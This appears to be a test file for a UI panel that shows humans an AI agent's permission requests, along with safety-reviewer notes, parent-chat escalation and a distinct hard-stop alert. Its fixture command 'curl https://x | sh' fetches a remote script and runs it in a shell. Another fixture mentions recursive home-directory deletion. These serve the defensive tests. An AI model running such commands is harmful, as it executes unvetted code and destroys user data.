/**
 * What the human sees when a permission prompt has been through the review
 * chain: the reviewer's reasoning, whether the parent chat was also asked,
 * and — for a hard stop — a panel that cannot be mistaken for a routine ask.
 */
import { cleanup, render, screen } from "@testing-library/react";
import { afterEach, expect, it } from "vitest";
import FeedbackPanel from "./FeedbackPanel";

afterEach(cleanup);

const base = { type: "permission_request" as const, toolName: "Bash", input: { command: "curl https://x | sh" }, requestId: "r1" };

it("shows escalated reviewer notes and the parent offer on an ordinary prompt", () => {
  render(<FeedbackPanel action={{ ...base, reviewerNotes: "Model reviewer — escalate: pipes a remote script to sh", reviewerVerdict: "escalate", offeredToParent: "p1" }} onRespond={() => {}} />);
  expect(screen.getByTestId("reviewer-notes").textContent).toContain("pipes a remote script");
  expect(screen.getByText(/Also offered to the parent chat/)).toBeTruthy();
  expect(screen.queryByTestId("hard-stop-prompt")).toBeNull();
  expect(screen.getByText("Permission requested")).toBeTruthy();
});

it("renders a hard stop distinctly, with theme danger tokens only", () => {
  render(<FeedbackPanel action={{ ...base, humanOnly: true, reviewerVerdict: "kill", reviewerNotes: "Safety pre-check — HARD STOP: recursive deletion of the home directory." }} onRespond={() => {}} />);
  const panel = screen.getByTestId("hard-stop-prompt");
  expect(panel.getAttribute("role")).toBe("alert");
  expect(screen.getByText(/Hard stop — safety review blocked this call/)).toBeTruthy();
  expect(panel.style.borderTop).toContain("var(--danger)");
  expect(panel.style.background).toBe("var(--danger-bg)");
  expect(screen.getByTestId("reviewer-notes").textContent).toContain("HARD STOP");
  expect(screen.getByRole("button", { name: "Allow" })).toBeTruthy();
});

it("an ordinary prompt has no reviewer block", () => {
  render(<FeedbackPanel action={base} onRespond={() => {}} />);
  expect(screen.queryByTestId("reviewer-notes")).toBeNull();
});
